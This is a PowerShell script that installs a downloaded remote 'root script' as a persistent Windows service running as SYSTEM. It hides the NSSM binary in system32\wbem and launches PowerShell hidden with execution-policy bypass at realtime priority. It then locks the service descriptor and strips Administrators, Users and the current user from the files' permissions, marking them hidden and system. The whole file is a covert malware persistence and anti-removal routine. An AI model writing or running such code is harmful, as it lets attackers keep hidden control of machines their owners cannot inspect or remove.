# script must run as admin/SYSTEM
$nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"
$scriptPath = "path\to\root_script.ps1"
$serviceName = "MyService"
$exePath = "powershell.exe"
$arguments = "-ep bypass -noP -w hidden $scriptPath"
$downloadPath = "$env:temp\nssm.zip"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $downloadPath)){
    iwr -Uri $nssmUrl -OutFile $downloadPath
}

Expand-Archive -Path $downloadPath -DestinationPath $env:temp

if(-not(Test-Path -Path $scriptPath -PathType Leaf)){
    iwr -Uri "ROOT_SCRIPT_URI" -OutFile $scriptPath
}

if(-not(Test-Path -Path $nssmexe -PathType Leaf)){
    Move-Item -Path "$env:temp\nssm-2.24\win64\nssm.exe" -Destination $nssmexe
}

Remove-Item -Path $downloadPath -Force -Recurse
Remove-Item -Path "$env:temp\nssm-2.24" -Force -Recurse

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe start $serviceName

$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $nssmexe /A /R /D Y 2>&1 | Out-Null
takeown /F $scriptPath /A /R /D Y 2>&1 | Out-Null

#  Set SYSTEM as owner (prevents inheritance)
icacls $nssmexe /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
icacls $scriptPath /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null

# Remove inheritance and grant SYSTEM full control
icacls $nssmexe /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $nssmexe /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $scriptPath /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null
icacls $scriptPath /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:F" /T /Q 2>&1 | Out-Null

# Remov all other users/groups (optional safety measure)
icacls $nssmexe /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $nssmexe /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
icacls $scriptPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $scriptPath /remove:g "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null

# 4. Explicitly remove your user account
icacls $nssmexe /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null
icacls $scriptPath /remove:g "$env:computername\$env:username" /T /Q 2>&1 | Out-Null



attrib +h +s +r $nssmFolder
attrib +h +s +r $scriptPath